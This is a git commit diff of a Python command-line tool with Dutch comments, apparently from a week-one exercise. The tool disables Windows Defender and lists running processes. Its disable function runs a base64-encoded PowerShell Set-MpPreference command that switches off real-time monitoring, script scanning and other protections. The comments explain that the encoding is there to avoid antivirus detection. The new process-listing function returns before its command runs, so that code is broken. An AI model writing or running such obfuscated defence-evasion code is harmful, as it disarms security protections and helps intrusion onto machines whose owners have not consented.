f05dea2572537d12690bc88e33c96901d446e70a
Mario <mariomancev78@gmail.com>
2025-02-07 17:15:25 +0100

    feat: toon draaiende processen. fix:disable_defender

--- week_1/main.py
+++ week_1/main.py
@@ -28,24 +28,34 @@ def check_os():
 # Functie voor het uitzetten van Windows Defender
 def disable_win_defender():
     # base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
-    disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gIC1EaXNhYmxlSU9BVlByb3RlY3Rpb24gIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZCAtRW5hYmxlTmV0d29ya1Byb3RlY3Rpb24gQXVkaXRNb2RlIC1Gb3JjZSAtTUFQU1JlcG9ydGluZyBEaXNhYmxlZCAtU3VibWl0U2FtcGxlc0NvbnNlbnQgTmV2ZXJTZW5kCg=="
+    disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAgJHRydWUgLURpc2FibGVTY3JpcHRTY2FubmluZyAgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZA=="
     # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
     try:
         subprocess.call(f"powershell.exe {base64.b64decode(
             disable_cmd_b64).strip().decode()}", shell=True)
+        return "Defender is uitgeschakeld."
     except Exception as e:
         return f"Er ging iets mis: {e}"
 
 
+def show_running_processes():
+    show_ps_command = "gps"
+    try:
+        return "de draaiende processen:"
+        subprocess.call(f"powershell.exe {show_ps_command}", shell=True)
+    except Exception as e:
+        return f"er ging iets mis: {e}"
+
+
 @click.command()
-@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable_defender"]))
-# disable_defender is de enige fuctionaliteit voor nu...
+@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable_defender", "ps"]))
+# disable_defender voor het uitzetten van defender. ps voor het tonen van draaiende processen.
 # Main functie
 def main(action):
     if not action:
         show_banner()
         action = click.prompt('Welke actie wil je uitvoeren?',
-                              type=click.Choice(["disable_defender"]))
+                              type=click.Choice(["disable_defender", "ps"]))
     match action:
         case "disable_defender":
             # Is dit een windows omgeving?
@@ -54,6 +64,8 @@ def main(action):
             else:
                 click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {
                            sys.platform}")
+        case "ps":
+            click.echo(show_running_processes())
 
 
 if __name__ == '__main__':
